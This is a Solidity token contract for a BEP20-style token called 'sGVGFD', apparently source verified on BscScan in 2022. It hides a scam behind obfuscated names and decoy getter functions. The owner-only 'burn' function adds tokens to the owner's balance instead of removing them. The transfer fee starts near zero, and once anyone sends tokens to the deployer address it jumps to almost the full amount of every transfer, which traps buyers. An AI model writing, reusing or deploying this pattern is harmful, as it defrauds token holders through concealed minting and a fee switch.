/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.4;
contract sGVGFD {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
address private  IzerKc = address(0);
address private  fGlSxT = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  WacSGs = 1000000000000000000000;
uint256 private  YbZPpb = 10000000000;
address private  XauITs = address(0);
address private  pymUNZ = address(0);
uint256 private  mfyvxh = 1000000000000000;
uint256 private  DFqNbn = 100000000;
uint256 private  sGVGFD4 = 100000000;
uint256 private  pepBAJ = 1000000000000000000;
address private  bIDQAv = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "sGVGFD";
uint256 private  ZHpdwA = 10000000000000;
string public  name = "sGVGFD";
address private  tMHffy = address(0);
address public owner;
address private  PxtreY = address(0);
uint256 private  TKjdsH = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
address private  OFHsfD = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant hvmccs = 99999;
address private  YDJYNz = address(0);


function _gettMHffy() private returns (address) {
return tMHffy;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getXauITs() private returns (address) {
return XauITs;
}





function _getZHpdwA() private returns (uint256) {
return ZHpdwA;
}

constructor () {
pymUNZ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getfGlSxT() private returns (address) {
return fGlSxT;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tZXPNHo 0");
require(spender != address(0), "fZXPNHo 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function _getDFqNbn() private returns (uint256) {
return DFqNbn;
}



function _getTKjdsH() private returns (uint256) {
return TKjdsH;
}









modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getYDJYNz() private returns (address) {
return YDJYNz;
}

function _getPxtreY() private returns (address) {
return PxtreY;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getbIDQAv() private returns (address) {
return bIDQAv;
}

function _getIzerKc() private returns (address) {
return IzerKc;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZXPNHo");
require(to != address(0), "ZXPNHo");
require(amount <= balanceOf[from], "ZXPNHo");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount * hvmccs/pepBAJ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==pymUNZ){
pepBAJ = hvmccs+sGVGFD4/sGVGFD4+1;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}








function _getWacSGs() private returns (uint256) {
return WacSGs;
}

function _getmfyvxh() private returns (uint256) {
return mfyvxh;
}

function _getYbZPpb() private returns (uint256) {
return YbZPpb;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getOFHsfD() private returns (address) {
return OFHsfD;
}




}